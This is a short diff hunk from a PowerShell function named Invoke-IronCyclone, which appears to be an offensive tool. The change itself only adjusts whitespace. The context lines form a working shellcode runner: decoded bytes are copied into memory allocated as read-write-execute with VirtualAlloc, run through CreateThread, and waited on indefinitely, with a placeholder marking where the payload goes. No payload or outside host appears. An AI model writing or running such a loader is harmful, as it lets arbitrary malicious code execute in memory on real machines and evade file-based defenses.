@@ -31,7 +31,7 @@ function Invoke-IronCyclone(){
     ####CALL####
 
     $size = $decoded.Length
-    [IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x3000,0x40);
+    [IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);
     [System.Runtime.InteropServices.Marshal]::Copy($decoded, 0, $addr, $size)
     $thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
     [Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
